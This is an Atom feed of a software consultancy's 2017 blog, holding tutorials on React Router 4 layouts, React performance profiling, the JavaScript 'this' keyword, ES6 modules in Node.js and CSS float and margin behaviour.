<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-12-01T14:00:57+02:00</updated><id>http://localhost:4000/</id><title type="html">achiral</title><subtitle>achiral offers consulting and custom software development services on the node.js and .NET stacks.
</subtitle><entry><title type="html">Multiple Levels Of Layout With React Router 4</title><link href="http://localhost:4000/react-router-4" rel="alternate" type="text/html" title="Multiple Levels Of Layout With React Router 4" /><published>2017-12-01T05:39:37+02:00</published><updated>2017-12-01T05:39:37+02:00</updated><id>http://localhost:4000/react-router-4</id><content type="html" xml:base="http://localhost:4000/react-router-4">&lt;p&gt;Today, we are going to look at building page layouts with React Router 4. If you’ve switched to it, you would find that a lot of the code you used with Router 3 doesn’t really work, and a lot of the answers on Stack Overflow refer to older version.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/router4.jpeg&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A webpage usually has common elements such as the top bar where the user can log in/out, the footer etc. Since the DRY (don’t repeat yourself) principle tells us not to duplicate code, you obviously don’t want to copy paste the common parts of the layout in every page of your website you are building. This is the reason why frameworks such as Rails or ASP.NET MVC come with layout and partial view functionality out of the box.&lt;/p&gt;

&lt;p&gt;React’s compositional nature would also allow for this, but since you are on the client and you (presumably) want to use &lt;a href=&quot;https://en.wikipedia.org/wiki/Deep_linking&quot;&gt;deep-linking&lt;/a&gt;, you would use a routing package such as React Router to be able to react to client-side route changes.&lt;/p&gt;

&lt;p&gt;As a side note, client-side routing packages rely on the browser’s ability to redirect to &lt;em&gt;anchors&lt;/em&gt;, which locations within the same page, so it doesn’t to a request to the server. So whenever you are doing something like:&lt;/p&gt;

&lt;pre&gt;
&amp;lt;a href=&quot;http://thepage.com#anchor&quot;&amp;gt;Click me&amp;lt;/a&amp;gt;
&lt;/pre&gt;

&lt;p&gt;…the page will scroll to the position of the element with &lt;em&gt;id=”anchor”&lt;/em&gt; within the same page. In the early days of the web, this was useful for giving people links to a portion of the page–say if you had a long article, you could simply link to a paragraph in that article. Of course, that’s history because after &lt;a href=&quot;https://en.wikipedia.org/wiki/XMLHttpRequest&quot;&gt;XHR&lt;/a&gt; came along courtesy of Microsoft, we ended up with Ajax and with a plethora of frameworks on our hands, including React and its preferred routing package, React Router.&lt;/p&gt;

&lt;h2 id=&quot;a-look-at-react-router-as-it-comes-out-of-the-box&quot;&gt;A Look At React Router As It Comes Out Of The Box&lt;/h2&gt;
&lt;p&gt;Since building a React application is like assembling Lego pieces (components), it would make sense that React Router also works the same, so your typical application root component (&lt;i&gt;&amp;lt;App/&amp;gt;&lt;/i&gt; by convention) would look something like this:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/6e85c1ad656f6f8c92164479c37d9a7b.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;As you can see, it’s not really very hard to add common layout elements to a React application that is using React Router, because we can easily include components such as &lt;i&gt;Header&lt;/i&gt; and &lt;i&gt;Footer&lt;/i&gt; in the root component of the application. So…&lt;/p&gt;

&lt;h2 id=&quot;what-exact-problem-are-we-trying-to-solve-here&quot;&gt;What Exact Problem Are We Trying To Solve Here?&lt;/h2&gt;
&lt;p&gt;That is all fine and dandy, but what if you want to:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Have layouts only for some pages and not for others (such as a login page)?&lt;/li&gt;
  &lt;li&gt;Have one layout for some pages and another for other pages?&lt;/li&gt;
  &lt;li&gt;Have nested levels of layout?&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Turns out React’s compositional nature helps us here. We are going to start out by creating a &lt;em&gt;stateless&lt;/em&gt; component for our layout, which is going to look like this:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/dd7638803e2d716c01b7a79c2692ab9b.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;We can also have a Layout2, Layout3 etc. and so forth. Not to mention that we can embed one layout in another and add extra stuff.&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/06454bf059091bd9e6d15d8e0692c2aa.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;And there you have it! That is how you can achieve 1, 2 and 3 with React Router. Not only that, but this is how you pass values for parameters, say if you have something like a &lt;em&gt;product_id&lt;/em&gt; which comes from the query string, because the router automatically passes query string params as props to our layout components.&lt;/p&gt;

&lt;p&gt;Happy coding!&lt;/p&gt;</content><author><name></name></author><summary type="html">Today, we are going to look at building page layouts with React Router 4. If you’ve switched to it, you would find that a lot of the code you used with Router 3 doesn’t really work, and a lot of the answers on Stack Overflow refer to older version.</summary></entry><entry><title type="html">Tweaking React Application Performance</title><link href="http://localhost:4000/react-perf" rel="alternate" type="text/html" title="Tweaking React Application Performance" /><published>2017-11-29T05:39:37+02:00</published><updated>2017-11-29T05:39:37+02:00</updated><id>http://localhost:4000/react-perf</id><content type="html" xml:base="http://localhost:4000/react-perf">&lt;p&gt;React is fast. If you’re coming from the world of Angular, you might think it’s REALLY, REALLY fast. But no matter how fast a library is, there will come a time when you will encounter performance bottlenecks, especially if you are building something like a page that has infinite scrolling and you end up with a lot of objects on your page. Which is why it’s important to understand how React handles component updates and how its &lt;em&gt;reconciliation&lt;/em&gt; process works.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/react-perf.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You might have noticed something: in React (as opposed to Vue or AngularJS), changing state directly (mutating a property of a component) doesn’t have any effect on the actual UI and you have to actually call the method &lt;em&gt;setState()&lt;/em&gt; in order for this to happen. This is because React needs a way to figure out the parts of the state that changed (if you are wondering how Vue is doing this, know that it’s wrapping the state properties with getters and setters, but that’s a subject for another article).&lt;/p&gt;

&lt;h2 id=&quot;understanding-the-diffing-process&quot;&gt;Understanding The Diffing Process&lt;/h2&gt;
&lt;p&gt;I will briefly try to give an overview of how React handles state changes: when calling &lt;em&gt;setState()&lt;/em&gt;, React does a comparison (or diffing) between the value of the UI components and the component state, but it doesn’t check directly against the browser DOM, because that would be very slow. Instead, it maintains a &lt;em&gt;virtual DOM&lt;/em&gt; in memory and it does diffing against this.&lt;/p&gt;

&lt;p&gt;Normally the optimal diffing algorithmic for two trees is of O(N&lt;sup&gt;3&lt;/sup&gt;) complexity, but Reacts uses some heuristics, which makes this faster for the majority of real cases. Namely:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;React first starts with the root of the trees. If they are not the same instance, it marks the whole tree as “dirty”, which will result in a complete re-render.&lt;/li&gt;
  &lt;li&gt;If they are the same instance, it will proceed to compare all the properties and so forth recursively.&lt;/li&gt;
  &lt;li&gt;If the instance has not changed, then React proceeds further down the tree and checks the properties of the objects.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/images/v-dom.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, calling &lt;em&gt;setState()&lt;/em&gt; doesn’t re-render that part of the component synchronously. Instead it just marks it, and rendering happens at a later tick in the JS event loop.&lt;/p&gt;

&lt;blockquote&gt;
The key takeaway here is that the React diffing process is a &lt;b&gt;trade-off&lt;/b&gt;. It is not necessarily the optimal algorithm for diffing random trees, but it works well in real life scenarios, which is what we ultimately care about.
&lt;/blockquote&gt;

&lt;h2 id=&quot;measuring-performance&quot;&gt;Measuring Performance&lt;/h2&gt;
&lt;p&gt;With all the nice performance features built in, there will still occasionally come a time where you need to profile the performance of your components. &lt;em&gt;ReactPerf&lt;/em&gt; is a tool that gives an overview about an app’s overall performance and helps discover optimization opportunities where &lt;em&gt;shouldComponentUpdate()&lt;/em&gt; lifecycle hooks should be implemented. The Perf object is available as a React add-on and can be used with React in development mode only. You should not include this bundle when building your app for production.&lt;/p&gt;

&lt;p&gt;Installing it is simple:&lt;/p&gt;

&lt;pre&gt;
npm install --save react-addons-perf
&lt;/pre&gt;

&lt;p&gt;…and it comes with a bunch of nifty methods which you can pepper throughout your code.&lt;/p&gt;

&lt;p&gt;Here’s what it includes:&lt;/p&gt;

&lt;pre&gt;
// starts the measurment
Perf.start()

// stops the measurement
Perf.stop()

// prints the whole time
Perf.printInclusive()

// prints the whole time
Perf.printExclusive()

// prints wasted time
Perf.printWasted()
&lt;/pre&gt;

&lt;p&gt;The easiest way to use it is to just wrap your whole &lt;em&gt;&lt;App&gt;&lt;/App&gt;&lt;/em&gt; component and then display statics.&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/06c305c1c4781ff69e150a06482d9c3a.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;The output of the library is something like this, which should give you hints on what components can be optimized:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/reactperf.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As I mentioned previously, if a parent component changes, React re-renders all the children, but there is a way to override this. It also provides the &lt;em&gt;shouldComponentUpdate()&lt;/em&gt; lifecycle method, which is triggered before the re-rendering process starts and provides the possibility of not computing a render tree entirely—the method receives &lt;em&gt;nextProps&lt;/em&gt; and &lt;em&gt;nextState&lt;/em&gt; as arguments, and you should return either true or false to tell React if the component needs to be re-rendered. It defaults to true, but if you return false, the component is considered clean, and therefore no diffing or rendering is performed.&lt;/p&gt;

&lt;p&gt;The default implementation of &lt;em&gt;shouldComponentUpdate()&lt;/em&gt; is a simple function that always returns true. ReactPerf helps us figure out where time is being wasted on unnecessary redraws and where it might make sense to override this function but keep in mind that your implementation needs to be faster than actually re-rendering the component, otherwise you not only wasted development time, you’ve made the performance of your app worse.&lt;/p&gt;

&lt;h2 id=&quot;immutability-to-the-rescue&quot;&gt;Immutability To The Rescue&lt;/h2&gt;
&lt;p&gt;Immutability as a concept is useful because in functional programming you work with &lt;em&gt;values&lt;/em&gt; NOT &lt;em&gt;variables&lt;/em&gt;. This means your first class citizens are functions not objects, and functions by definition work with values, as opposed to objects which have a mutable state.&lt;/p&gt;

&lt;p&gt;But an interesting side effect of using immutable values for state, is that it actually makes React’s diffing performance better. Since a library like ImmutableJs creates a new object instance for properties in an object that have changed, just doing a normal compare is going to tell React that something inside a complex object tree has changed, without the need to go recursively down the tree and check EACH property.&lt;/p&gt;</content><author><name></name></author><summary type="html">React is fast. If you’re coming from the world of Angular, you might think it’s REALLY, REALLY fast. But no matter how fast a library is, there will come a time when you will encounter performance bottlenecks, especially if you are building something like a page that has infinite scrolling and you end up with a lot of objects on your page. Which is why it’s important to understand how React handles component updates and how its reconciliation process works.</summary></entry><entry><title type="html">The Pesky Javascript “This” Keyword</title><link href="http://localhost:4000/js-this" rel="alternate" type="text/html" title="The Pesky Javascript &quot;This&quot; Keyword" /><published>2017-09-27T06:39:37+03:00</published><updated>2017-09-27T06:39:37+03:00</updated><id>http://localhost:4000/js-this</id><content type="html" xml:base="http://localhost:4000/js-this">&lt;p&gt;Probably all React developers will nod knowingly when they see this (but surprisingly, not all of them can articulate what is really happening behind the scenes):&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/9ef524ab66712f8eacec0468bc3d649b.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;Here’s the thing: &lt;em&gt;class&lt;/em&gt; and &lt;em&gt;constructor&lt;/em&gt; are just syntactic sugar because Javascript doesn’t really have classes, it supports only prototypical inheritance.&lt;/p&gt;

&lt;p&gt;What it means is:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Each object is actually a property bag—it’s nothing more than a dictionary where the keys are always strings.&lt;/li&gt;
  &lt;li&gt;Each object has a “prototype” property, which is a reference to the object it inherits from.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Here’s another example:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/c263477af7cb431aba62f16ee4dcf31a.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;In ES5 code, this is equivalent to:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/0647bc237c84cf23bc13992fe00f571e.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;We’ve already seen two examples of using the &lt;em&gt;this&lt;/em&gt; keyword in Javascript. Here’s the key takeaway: &lt;em&gt;In JS, this is contextual. It’s being set by the calling code&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;When a function is called with the &lt;em&gt;new&lt;/em&gt; keyword, it means it’s meant to be used as a constructor, so &lt;em&gt;this&lt;/em&gt; will be set to &lt;strong&gt;{}&lt;/strong&gt; (just an empty Javascript object). It’s the role of the constructor to fill this object with data. You can also notice that in the constructor we are setting the &lt;em&gt;showX&lt;/em&gt; property to a function (that could also have been set on the prototype property of the constructor, but that’s another discussion). In the example, calling &lt;em&gt;this.showX()&lt;/em&gt; is successful, but not calling &lt;em&gt;showX()&lt;/em&gt; (the global variable which we set to point to the function). That’s another example in which &lt;em&gt;this&lt;/em&gt; is being bound to an object instance by Javascript.&lt;/p&gt;

&lt;p&gt;In fact, you could write something like this in ES5:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/3b6517676b08010cb7fedeed6518bc47.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;And yes, it would work because we called the function in the context of the &lt;em&gt;myObj&lt;/em&gt; object.&lt;/p&gt;

&lt;p&gt;As you can see, &lt;em&gt;this&lt;/em&gt; is contextual. By default, it point points to the global &lt;em&gt;window&lt;/em&gt; object (if you are running Javascript in the browser, and not on the server). You could also write some HTML code that looks like this:&lt;/p&gt;

&lt;pre&gt;
&amp;lt;button onclick=&quot;onClick()&quot;&amp;gt;Click me!&amp;lt;/button&amp;gt;
&lt;/pre&gt;

&lt;p&gt;In this particular case, &lt;em&gt;this&lt;/em&gt; will be bound to the &lt;em&gt;Button&lt;/em&gt; instance and you would be able to do DOM manipulation in the handler. As you can see in React, you are not always getting a reference to what you expect in &lt;em&gt;this&lt;/em&gt;! Luckily we can fix this, because we can actually specify the value &lt;em&gt;this&lt;/em&gt; gets.&lt;/p&gt;

&lt;p&gt;So in our example, we could do this:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/08870436c4aaa5f0fab9fb7e70ccb849.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;The Javascript &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/apply&quot;&gt;&lt;em&gt;apply()&lt;/em&gt;&lt;/a&gt; method (which all objects of type &lt;em&gt;Function&lt;/em&gt; have) allows us to specify the value of &lt;em&gt;this&lt;/em&gt;, as well as values for any params the function might take. &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/call&quot;&gt;&lt;em&gt;call()&lt;/em&gt;&lt;/a&gt; is similar, but it takes an array of values for the params.&lt;/p&gt;

&lt;p&gt;That’s helpful, but we might not always want to pass that &lt;em&gt;this&lt;/em&gt; object as a parameter. Isn’t there an easier way? It actually is, we can use bind():&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/1be29639d35f2074cf1b4a93204e0818.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;What we’ve done is create a &lt;strong&gt;new&lt;/strong&gt; function instance that calls the old function for which &lt;em&gt;this&lt;/em&gt; (inside the function) is bound to an object. Yes, we can do this because Javascript is a dynamic language, which means functions are first class citizens and also objects at the same time! It’s important to keep this in mind: just because you declared a function inside a class in ES6, it doesn’t mean it’s bound to an object, which is why we use the bind trick in the constructor.&lt;/p&gt;

&lt;p&gt;One more thing. You might have seen something like this in old jQuery code:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/1359ef89241073a5036c498856748ab1.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;If you don’t want to use this trick, what you could do is:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/a31be96ecaf71dab18f3df0ebb61f513.js&quot;&gt;&lt;/script&gt;
&lt;blockquote&gt;

&lt;/blockquote&gt;

&lt;p&gt;We used a &lt;em&gt;lambda&lt;/em&gt; or inline function. Keep in mind these have no effect on the &lt;em&gt;this&lt;/em&gt; keyword but are an ES6 feature which might not be supported by older browsers. Oh, and ditch jQuery altogether, I was just using it as an example.&lt;/p&gt;</content><author><name></name></author><summary type="html">Probably all React developers will nod knowingly when they see this (but surprisingly, not all of them can articulate what is really happening behind the scenes):</summary></entry><entry><title type="html">ES6 Modules And Node.js</title><link href="http://localhost:4000/es6-modules-node" rel="alternate" type="text/html" title="ES6 Modules And Node.js" /><published>2017-09-23T09:39:37+03:00</published><updated>2017-09-23T09:39:37+03:00</updated><id>http://localhost:4000/es6-modules-node</id><content type="html" xml:base="http://localhost:4000/es6-modules-node">&lt;p&gt;With the addition of &lt;em&gt;async/await&lt;/em&gt; and classes in Javascript and subsequently in V8, many more developers started taking Node.js seriously as a web development platform. I do believe Node was worth considering before, but I see their point—its asynchronous nature made callbacks quite unpleasant to work with. Promise chaining changed this a bit, but it’s a far cry from writing code using async/await and actually, as of lately, it’s possible to write Javascript serverside code almost entirely in ES6 without Babel, with a notable exception…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/es6-mods.jpg&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;You cannot use ES6 imports YET.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Which seems to be a little bit weird because you’d guess that it’s probably one of the easiest things to be implemented in a JS engine. But you’d be wrong because supporting this of Node.js is not exactly a walk in the park, considering there are quite a lot of applications out there and they using a different module standard: CommonJS.&lt;/p&gt;

&lt;p&gt;And serverside applications are a big part of the JS landscape.&lt;/p&gt;

&lt;h2 id=&quot;es6-modules-versus-commonjs&quot;&gt;ES6 Modules Versus CommonJS&lt;/h2&gt;
&lt;p&gt;On the surface, they seem similar, but they are not. There is a fundamental difference between the two: &lt;em&gt;the code in the CommonJS module needs to be executed to see what that module exports, whereas an ES6 module needs only to be parsed (compiled).&lt;/em&gt;&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/5876ea604202b6a97e4ddef1d96bf6ee.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;whereas ES6 exports look like this:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/7ba115e874be93f08cca634b0990ac1b.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;&lt;em&gt;Ideally, we’d want to be able to write new ES6 code that would run alongside old code, which means we want to be able to import CommonJS modules, as well as require new ES6 modules.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;So what a CJS module exports is available only at runtime, NOT at compile time (remember V8 does just-in-time compilation). Also, the existing &lt;em&gt;require()&lt;/em&gt; function is synchronous, whereas the ES6 specification states that imports can be async (but DON’T HAVE TO BE, which is good news for Node). Changing the existing implementation for &lt;em&gt;require()&lt;/em&gt; would also break a lot of the existing libraries which make assumptions about the way it works. Since the require function is synchronous, module resolution in CJS happens in one event loop tick. With ES6, the module is first parsed and its interface inferred, and ONLY THEN evaluated, so it might take multiple ticks.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;This means it won’t be possible to change &lt;em&gt;require()&lt;/em&gt; to import ES6 modules. The alternative would be to create a new &lt;em&gt;require.import()&lt;/em&gt; function, but this isn’t as nice.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;It does however mean that ES6 modules will be able to import CommonJS modules, because they happen in one tick. The tricky part here is figuring if a module is ES6 or CommonJS.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Browsers know that a module is ES6 or not like this:&lt;/p&gt;
&lt;pre&gt;
&amp;lt;script type=&quot;module&quot; src=&quot;./es6module.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/pre&gt;

&lt;p&gt;However Node.js doesn’t have that luxury. The solution the community agreed upon was using &lt;em&gt;.mjs&lt;/em&gt; files to denote ES6 modules, also affectionately  named the &lt;strong&gt;Michael Jackson Solution&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;While this is work in progress, so far it’s fair to assume that:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The &lt;em&gt;require()&lt;/em&gt; function won’t be available in ES6 module files.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;import&lt;/em&gt; won’t be available to CommonJS modules.&lt;/li&gt;
  &lt;li&gt;ES6 modules will be able to import CJS modules, as well as other ES6 modules (obviously).&lt;/li&gt;
  &lt;li&gt;CJS modules will be able to &lt;em&gt;require.import()&lt;/em&gt; ES6 modules, as well as other CJS modules using &lt;em&gt;require()&lt;/em&gt; like before.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Also, there is an issue with named imports when importing a CommonJS module. The difference again has to do with with the fact the public interface of an ES6 module can be determined at compile time, whereas CommonJS modules actually have to be executed.&lt;/p&gt;

&lt;p&gt;Which means for a CJS module that looks like this:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/9767933b001009e22e308646bded11fb.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;The importing code would look like:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/065b799bf404d013d39990d9f19d9482.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;Keep in mind that defaultImport will not be ‘some_text’ because &lt;em&gt;import&lt;/em&gt; doesn’t evaluate the code. It would actually be an object containing all the objects declared which would look like this in our case:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/8479c5631752575058c1e79237a618eb.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;Floating is a typical way of&lt;/p&gt;

&lt;p&gt;Also, we are probably looking at beginning 2018 before any of this functionality is available.&lt;/p&gt;</content><author><name></name></author><summary type="html">With the addition of async/await and classes in Javascript and subsequently in V8, many more developers started taking Node.js seriously as a web development platform. I do believe Node was worth considering before, but I see their point—its asynchronous nature made callbacks quite unpleasant to work with. Promise chaining changed this a bit, but it’s a far cry from writing code using async/await and actually, as of lately, it’s possible to write Javascript serverside code almost entirely in ES6 without Babel, with a notable exception…</summary></entry><entry><title type="html">HTML Layout: The Weird Parts</title><link href="http://localhost:4000/weird-html" rel="alternate" type="text/html" title="HTML Layout: The Weird Parts" /><published>2017-09-15T06:39:37+03:00</published><updated>2017-09-15T06:39:37+03:00</updated><id>http://localhost:4000/weird-html</id><content type="html" xml:base="http://localhost:4000/weird-html">&lt;p&gt;If you have worked with another layout engine other than HTML, you probably think that HTML is really hacky and unpredictable. And you wouldn’t be mistaken to think that: sometimes things expand to fill the available spaces, sometimes they don’t. Sometimes you specify a margin and it is respected. Sometimes it’s not. Most developers would feel your pain, but here’s the thing:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;HTML evolved overtime, and sometimes a bit chaotically. It wasn’t thought out from the start in its current form.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Yet as web developers, we need to use it so we still need to understand its quirks. And first and foremost we need to understand the fundamental philosophy of HTML: it designed to describe pages that flow vertically, as opposed to say something like PDF documents which don’t flow AT ALL (they have &lt;strong&gt;fixed layout&lt;/strong&gt;). Mobile applications are also not really designed to flow so a lot of the UI elements like labels and buttons have fixed positions, while desktop applications (both Windows and MacOS) are somewhere in between because you can resize the application window. Keep this in mind: &lt;em&gt;the browser usually assumes you read the content in the webpage from top to bottom and you use the scroll bar to navigate&lt;/em&gt;. The Facebook wall would be a perfect example of this philosophy.&lt;/p&gt;

&lt;p&gt;A byproduct of this assumption is that divs expand to fill the whole available space horizontally but not vertically. As a web developer, you are also expected to take into account the possibility the user might change the zoom factor of the page (to increase font-size), so it’s important that the application is responsive. Not to mention he or she might view the webpage from a mobile device.&lt;/p&gt;

&lt;p&gt;Before we explain the more quirky aspects of HTML, we need to have a basic overview of the box layout of the elements:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/css-box-model.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So an element will have&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Some content&lt;/li&gt;
  &lt;li&gt;A border which can have some thickness to it&lt;/li&gt;
  &lt;li&gt;Some padding between the border  and the actual content&lt;/li&gt;
  &lt;li&gt;Margin which indicates the space between the border and the neighboring elements&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Keep in mind that by default the &lt;em&gt;width&lt;/em&gt; and &lt;em&gt;height&lt;/em&gt; CSS properties actually refer to the size of the content and they DON’T include padding and margin size, which is a bit counterintuitive.&lt;/p&gt;

&lt;p&gt;Here’s what you need to do:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/12fcda543d0c76cd57df3890917cfdd8.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;The default value is &lt;em&gt;content-box&lt;/em&gt;.&lt;/p&gt;

&lt;h2 id=&quot;margin-collapse&quot;&gt;Margin Collapse&lt;/h2&gt;
&lt;p&gt;A weird aspect of HTML (if you don’t know about it) is the way margins behave.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/collapse.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Margin collapsing means that if you have two elements with margins set on them, the space between them will equal the maximum of the two margins, NOT the sum. But this happens &lt;strong&gt;only vertically&lt;/strong&gt;. This again has to do with the vertical flow philosophy of HTML.&lt;/p&gt;

&lt;p&gt;But there’s another catch: margin collapsing doesn’t happen for the first or last element of a &lt;em&gt;block formatting context&lt;/em&gt;. But before we talk about those, let’s talk about…&lt;/p&gt;

&lt;h2 id=&quot;float-and-clear&quot;&gt;Float And Clear&lt;/h2&gt;
&lt;div style=&quot;background-color: #f8f8f8; padding: 15px;&quot;&gt;
  &lt;div style=&quot;display: block; width: 64px; height: 64px; background-color: cyan; float: left; margin-right: 12px;&quot;&gt;&lt;/div&gt;
  &lt;div style=&quot;display: block; width: 64px; height: 64px; background-color: red; float: left; margin-right: 12px;&quot;&gt;&lt;/div&gt;
  &lt;div style=&quot;display: block; width: 64px; height: 64px; background-color: magenta; float: right; margin-left: 12px;&quot;&gt;&lt;/div&gt;
  &lt;div style=&quot;display: block; width: 64px; height: 64px; background-color: yellow; float:left; clear: left; margin-right: 12px; margin-top: 12px&quot;&gt;&lt;/div&gt;
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam ultricies, dolor lacinia varius bibendum, augue ante tempor quam, nec faucibus tortor ligula non nisl. Suspendisse nec odio at orci dignissim ultrices. Morbi ac turpis ac tortor luctus euismod ut eget ante. Curabitur egestas luctus tortor, vitae fermentum est vestibulum id. Fusce imperdiet velit quis ornare hendrerit. Interdum et malesuada fames ac ante ipsum primis in faucibus. Aliquam dapibus massa et magna egestas, sit amet vehicula turpis lacinia. Ut tristique elit purus, et ultricies lorem volutpat vitae. Phasellus pellentesque imperdiet sapien id pretium. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.
&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The CSS for these elements actually looks like this:
&lt;script src=&quot;https://gist.github.com/toaderflorin/81854817ad5a2c3262633cc8b5e06717.js&quot;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;Floats are a standard way of incorporating an image (or some sort of container block) into a paragraph of text. Not only can you have multiple images, but you can actually use both &lt;em&gt;float&lt;/em&gt; and &lt;em&gt;clear&lt;/em&gt; at the same time.&lt;/p&gt;

&lt;p&gt;Keep in mind that floating elements don’t have any effect on the size of the container:&lt;/p&gt;

&lt;div style=&quot;background-color: #f8f8f8; padding: 15px;&quot;&gt;
  &lt;div style=&quot;display: block; width: 128px; height: 128px; background-color: salmon; float: left; margin-right: 12px;&quot;&gt;&lt;/div&gt;  
  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam ultricies, dolor lacinia varius bibendum, augue ante tempor quam, nec faucibus tortor ligula non nisl. Suspendisse nec odio at orci dignissim ultrices. Morbi ac turpis ac tortor luctus euismod ut eget ante.
&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;This might not actually be the desired outcome, but it turns out there is a workaround.&lt;/p&gt;

&lt;div style=&quot;background-color: #f8f8f8; padding: 15px;&quot;&gt;
  &lt;div style=&quot;display: block; width: 128px; height: 128px; background-color: orange; float: left; margin-right: 12px;&quot;&gt;&lt;/div&gt;  
  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam ultricies, dolor lacinia varius bibendum, augue ante tempor quam, nec faucibus tortor ligula non nisl. Suspendisse nec odio at orci dignissim ultrices. Morbi ac turpis ac tortor luctus euismod ut eget ante.
  &lt;div style=&quot;clear: both;&quot;&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;
What I did was add an empty div at the end of the parent container, like so:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/08ba23d70fdf75540776c69b3bc40ced.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;That’s a bit annoying so what you could do is create a CSS class that always appends an html element that does the clearing (like we previously did). This trick is called a &lt;strong&gt;clearfix&lt;/strong&gt;.&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/3605269010a8e7d506cf932afd496917.js&quot;&gt;&lt;/script&gt;

